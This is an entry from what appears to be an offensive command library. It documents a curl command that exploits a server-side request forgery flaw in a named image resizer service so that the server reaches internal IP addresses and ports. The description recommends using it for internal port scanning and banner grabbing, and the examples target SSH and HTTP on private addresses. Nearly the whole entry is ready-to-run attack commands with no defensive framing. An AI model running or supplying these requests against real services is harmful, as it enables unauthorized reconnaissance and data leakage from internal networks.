---
id: cmd-uuid-789
data: 'curl -v "https://resizer.line-apps.com/form?url=http://$INTERNAL_IP:$PORT"'
tags:
  - ssrf
  - web
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.216Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-request

## Command

```bash
curl -v "https://resizer.line-apps.com/form?url=http://$INTERNAL_IP:$PORT"
```

## Description

This curl command exploits the SSRF vulnerability by sending a GET request to the resizer /form endpoint with an internal URL in the 'url' parameter, forcing the server to fetch internal resources. Use it for port scanning or banner grabbing on internal networks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output to show headers and responses | Yes |
| `url=` | The parameter holding the forged internal URL (e.g., http://127.0.0.1:22) | Yes |
| `$INTERNAL_IP` | Placeholder for internal IP (e.g., 127.0.0.1, 10.0.0.1) | Yes |
| `$PORT` | Target port (e.g., 22 for SSH, 80 for HTTP) | Yes |

## Examples

### Basic Usage

```bash
curl -v "https://resizer.line-apps.com/form?url=http://127.0.0.1:22"
```

### Advanced Usage

```bash
curl -v -H "User-Agent: Mozilla/5.0" "https://resizer.line-apps.com/form?url=http://10.0.0.1:80/banner.txt"
```

## Expected Output

Verbose logs showing the request/response, potentially including internal banners (e.g., "SSH-2.0-OpenSSH"), connection errors for closed ports, or leaked content for successful exfiltration.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-in-Resizer-Service]]
